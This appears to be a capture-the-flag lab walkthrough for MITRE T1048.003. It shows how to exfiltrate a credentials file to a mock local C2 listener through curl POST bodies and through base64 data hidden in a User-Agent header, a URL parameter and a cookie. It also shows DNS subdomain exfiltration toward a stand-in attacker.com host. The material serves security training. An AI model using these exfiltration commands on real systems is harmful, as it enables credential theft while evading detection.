# T1048.003 – HTTP Exfiltration | Solution Walkthrough
**Difficulty:** Easy | **OS:** Linux | **MITRE:** T1048.003

## Step 1 – Start Mock C2 Receiver
```bash
bash /tmp/start_c2.sh
# HTTP listener on port 8888
```

## Step 2 – curl POST Exfiltration
```bash
# Direct POST (most common):
curl -X POST http://localhost:8888/ -d @/opt/sensitive-data/credentials.txt

# As JSON:
curl -X POST http://localhost:8888/ \
    -H "Content-Type: application/json" \
    -d "{\"data\":\"$(base64 /opt/sensitive-data/credentials.txt)\"}"
```

## Step 3 – Covert HTTP Methods
```bash
# User-Agent header (blends with normal web traffic):
curl -A "$(base64 /opt/sensitive-data/credentials.txt)" http://localhost:8888/

# URL parameter:
curl "http://localhost:8888/?data=$(cat /opt/sensitive-data/credentials.txt | base64 | tr '+/' '-_' | tr -d '=')"

# HTTP Cookie:
curl -H "Cookie: session=$(base64 /opt/sensitive-data/credentials.txt)" http://localhost:8888/
```

## Step 4 – DNS Exfiltration
```bash
# Encode data in DNS subdomain queries:
# Real: nslookup $(cat file | xxd -p | head -c 60).attacker.com
# Each DNS query carries 60 chars of data
data=$(cat /opt/sensitive-data/credentials.txt | base64 | head -c 50)
echo "DNS query would be: ${data}.attacker.com"
```

## Step 5 – Retrieve Flag from Exfil
```bash
cat /opt/sensitive-data/credentials.txt | head -1
# HACKTIFY{HTTP_EXFIL_<hash>}
```
